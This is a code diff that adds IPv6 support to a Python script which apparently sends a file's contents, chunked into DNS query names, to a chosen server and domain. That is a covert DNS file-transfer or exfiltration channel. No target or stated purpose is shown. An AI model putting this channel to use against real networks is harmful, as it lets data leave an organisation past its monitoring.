@@ -60,7 +60,9 @@ def send_query(sock, qname, server, port):
     packet = build_dns_query(qname, qid)
     for attempt in range(MAX_RETRIES):
         try:
-            sock.sendto(packet, (server, port))
+            # IPv6 sendto needs a 4-tuple: (server, port, flowinfo, scopeid)
+            dest = (server, port, 0, 0) if sock.family == socket.AF_INET6 else (server, port)
+            sock.sendto(packet, dest)
             sock.settimeout(TIMEOUT)
             resp, _ = sock.recvfrom(512)
             resp_qid = struct.unpack(">H", resp[:2])[0]
@@ -95,7 +97,9 @@ def main():
     print(f"File: {filename} ({len(file_bytes)} bytes, sha256 {hashlib.sha256(file_bytes).hexdigest()[:12]}...)")
     print(f"Sending {len(chunks)} chunks to {DOMAIN} via {args.server}:{args.port}, session {session}")
 
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    # IPv6 if the server looks like an IPv6 address, else IPv4
+    family = socket.AF_INET6 if ":" in args.server else socket.AF_INET
+    sock = socket.socket(family, socket.SOCK_DGRAM)
     sent = 0
     for i, chunk in enumerate(chunks, start=1):
         qname = f"{i:03d}.{chunk}.{session}.{DOMAIN}"
